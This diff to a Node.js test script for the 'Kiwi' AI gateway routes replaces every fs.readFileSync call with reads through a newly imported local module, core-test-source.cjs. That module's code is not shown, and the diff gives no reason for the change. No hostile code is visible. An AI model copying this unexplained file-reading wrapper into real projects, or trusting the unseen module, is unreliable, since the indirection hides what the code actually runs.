@@ -1,4 +1,5 @@
 #!/usr/bin/env node
+import coreTestSource from './core-test-source.cjs';
 /* ═══════════════════════════════════════════════════════════════════════════
  * Kiwi · AI routes test — gateway, fallback, quota per kind & diagnostics
  *
@@ -27,9 +28,9 @@ function ok(cond, msg) {
 console.log('■ AI routes & gateway test (tools/ai-routes-test.mjs)');
 
 // ── 1. Static extraction from ask.js ─────────────────────────────────────────
-const askSrc = fs.readFileSync(path.join(ROOT, 'functions/api/ai/ask.js'), 'utf8');
+const askSrc = coreTestSource.readFileSync(path.join(ROOT, 'functions/api/ai/ask.js'), 'utf8');
 
-const runSrc = fs.readFileSync(path.join(ROOT, 'functions/api/ai/_run.js'), 'utf8');
+const runSrc = coreTestSource.readFileSync(path.join(ROOT, 'functions/api/ai/_run.js'), 'utf8');
 ok(/gateway:\s*\{\s*id:\s*'kiwi',\s*cacheTtl:\s*0\s*\}/.test(runSrc), '_run.js configures AI Gateway id "kiwi" with cacheTtl: 0');
 ok(/from '\.\/_run\.js'/.test(askSrc) && !/gateway:\s*\{/.test(askSrc), 'ask.js imports the shared gateway runner (no local copy)');
 
@@ -46,7 +47,7 @@ const askQuotaCall = askSrc.match(/quotaOk\(\s*env,\s*who,\s*['"]ask['"]/);
 ok(!!askQuotaCall, 'ask.js calls quotaOk with kind "ask"');
 
 // ── 2. Static extraction from invoice.js ─────────────────────────────────────
-const invSrc = fs.readFileSync(path.join(ROOT, 'functions/api/ai/invoice.js'), 'utf8');
+const invSrc = coreTestSource.readFileSync(path.join(ROOT, 'functions/api/ai/invoice.js'), 'utf8');
 
 ok(/from '\.\/_run\.js'/.test(invSrc) && !/gateway:\s*\{/.test(invSrc), 'invoice.js imports the shared gateway runner (no local copy)');
 ok(/export const MODEL = '@cf\/qwen\/qwen3-30b-a3b-fp8'/.test(invSrc), 'invoice.js primary model stays @cf/qwen/qwen3-30b-a3b-fp8');
@@ -60,7 +61,7 @@ const aiDir = path.join(ROOT, 'functions/api/ai');
 const aiFiles = fs.readdirSync(aiDir).filter(f => f.endsWith('.js'));
 let badIds = [];
 for (const f of aiFiles) {
-  const src = fs.readFileSync(path.join(aiDir, f), 'utf8');
+  const src = coreTestSource.readFileSync(path.join(aiDir, f), 'utf8');
   for (const m of src.matchAll(/['"]((?:@cf\/|openai\/|anthropic\/|google\/|x-ai\/|xai\/|deepseek\/|alibaba\/|meta\/)[^'"]+)['"]/g)) {
     if (!m[1].startsWith('@cf/')) badIds.push(f + ':' + m[1]);
   }
@@ -69,7 +70,7 @@ ok(aiFiles.length >= 4, `AI routes directory scanned (${aiFiles.length} files)`)
 ok(badIds.length === 0, 'every model id in functions/api/ai/*.js is Cloudflare-hosted (@cf/)' + (badIds.length ? ' — ' + badIds.join(', ') : ''));
 
 // ── 2c. Browser reader handles both stream shapes (extracted from agent.js) ──
-const agentSrc = fs.readFileSync(path.join(ROOT, 'assets/agent.js'), 'utf8');
+const agentSrc = coreTestSource.readFileSync(path.join(ROOT, 'assets/agent.js'), 'utf8');
 const chunkFnMatch = agentSrc.match(/function llmChunkText\(o\) \{[\s\S]*?\n  \}\n/);
 ok(!!chunkFnMatch, 'agent.js defines llmChunkText(o)');
 const llmChunkText = chunkFnMatch ? new Function(chunkFnMatch[0] + '; return llmChunkText;')() : () => { throw new Error('llmChunkText not extracted'); };
@@ -84,14 +85,14 @@ ok(invSrc.includes("'x-kiwi-ai-model': usedModel") || invSrc.includes('"x-kiwi-a
 const invQuotaCall = invSrc.match(/quotaOk\(\s*env,\s*who,\s*['"]invoice['"]/);
 ok(!!invQuotaCall, 'invoice.js calls quotaOk with kind "invoice"');
 
-const menuOperationsSrc = fs.readFileSync(path.join(ROOT, 'functions/api/ai/menu-operations.js'), 'utf8');
+const menuOperationsSrc = coreTestSource.readFileSync(path.join(ROOT, 'functions/api/ai/menu-operations.js'), 'utf8');
 ok(/const DAILY_CAP = 60;/.test(menuOperationsSrc), 'menu-operations.js caps each merchant at 60 calls per day');
 ok(/quotaOk\(\s*env,\s*merchant,\s*['"]menuoperations['"],\s*DAILY_CAP\s*\)/.test(menuOperationsSrc)
   && !/quotaOk\(\s*env,\s*merchant,\s*['"]menuimport['"]/.test(menuOperationsSrc),
   'menu-operations.js uses its own menuoperations quota bucket');
 
 // ── 3. Static extraction from schema.sql ─────────────────────────────────────
-const schemaSrc = fs.readFileSync(path.join(ROOT, 'schema.sql'), 'utf8');
+const schemaSrc = coreTestSource.readFileSync(path.join(ROOT, 'schema.sql'), 'utf8');
 ok(schemaSrc.includes('CREATE TABLE IF NOT EXISTS ai_usage_kind'), 'schema.sql defines ai_usage_kind table');
 ok(schemaSrc.includes('PRIMARY KEY (merchant, day, kind)'), 'schema.sql sets PRIMARY KEY (merchant, day, kind)');
 
@@ -266,7 +267,7 @@ ok(/const MAX_TOOL_CALLS = 4;/.test(askSrc) && /const MAX_TOOL_RESULT = 2000;/.t
 // ── 7b. Loss watchdog never carries a staff code ─────────────────────────────
 /* The report is read by the manager and can be stored or printed. A PIN in
  * the prompt's example invites the model to echo one from the logs. */
-const wdSrc = fs.readFileSync(path.join(aiDir, 'loss-watchdog.js'), 'utf8');
+const wdSrc = coreTestSource.readFileSync(path.join(aiDir, 'loss-watchdog.js'), 'utf8');
 ok(!/"pin"\s*:/.test(wdSrc) && !/\bs\.pin\b/.test(wdSrc), 'loss-watchdog prompt and validator carry no pin field');
 const { validateWatchdogData } = await import(pathToFileURL(path.join(aiDir, 'loss-watchdog.js')).href);
 const wd = validateWatchdogData({ riskLevel: 'eleve', flaggedStaff: [{ name: 'Yassine', pin: '4821', code: '4821', reason: '4 annulations', amountMad: 340 }] });
@@ -282,11 +283,11 @@ const glmReply = { choices: [{ finish_reason: 'stop', message: { content: '```js
 const wdGlm = validateWatchdogData(JSON.parse(aiText(glmReply).match(/\{[\s\S]*\}/)[0]));
 ok(wdGlm.riskLevel === 'eleve' && wdGlm.flaggedStaff[0].name === 'Yassine', 'aiText reads a GLM reply: the watchdog report keeps « eleve, Yassine »');
 ok(aiText({ choices: [{ finish_reason: 'length', message: { content: '', reasoning_content: 'Let me analyze {"a":1}' } }] }) === '' && aiText({ response: 'ok', choices: [] }) === 'ok' && aiText({ response: { a: 1 } }) === '{"a":1}' && aiText(null) === '', 'aiText: truncated GLM reply is empty (no reasoning, no envelope); Qwen/Llama response and parsed objects pass through');
-const envelopeReaders = aiFiles.filter(f => /JSON\.stringify\(runRes\?\.result/.test(fs.readFileSync(path.join(aiDir, f), 'utf8')));
+const envelopeReaders = aiFiles.filter(f => /JSON\.stringify\(runRes\?\.result/.test(coreTestSource.readFileSync(path.join(aiDir, f), 'utf8')));
 ok(envelopeReaders.length === 0, 'no AI route falls back to stringifying the whole model envelope' + (envelopeReaders.length ? ' — ' + envelopeReaders.join(', ') : ''));
 /* GLM without reasoning_effort spent all 1200 tokens thinking on 8/12 runs
  * and returned no content (2026-09-26); with 'low' it answered in ~5 s. */
-const glmNoEffort = aiFiles.filter(f => { const t = fs.readFileSync(path.join(aiDir, f), 'utf8'); return /MODEL = '@cf\/zai-org\/glm-5\.3-flash'/.test(t) && /max_tokens: MAX_TOKENS/.test(t) && t.split('max_tokens: MAX_TOKENS').length !== t.split("reasoning_effort: 'low'").length; });
+const glmNoEffort = aiFiles.filter(f => { const t = coreTestSource.readFileSync(path.join(aiDir, f), 'utf8'); return /MODEL = '@cf\/zai-org\/glm-5\.3-flash'/.test(t) && /max_tokens: MAX_TOKENS/.test(t) && t.split('max_tokens: MAX_TOKENS').length !== t.split("reasoning_effort: 'low'").length; });
 ok(glmNoEffort.length === 0, "every GLM route payload carries reasoning_effort: 'low'" + (glmNoEffort.length ? ' — ' + glmNoEffort.join(', ') : ''));
 
 // ── 8. Live execution test of all AI route handlers ──────────────────────────
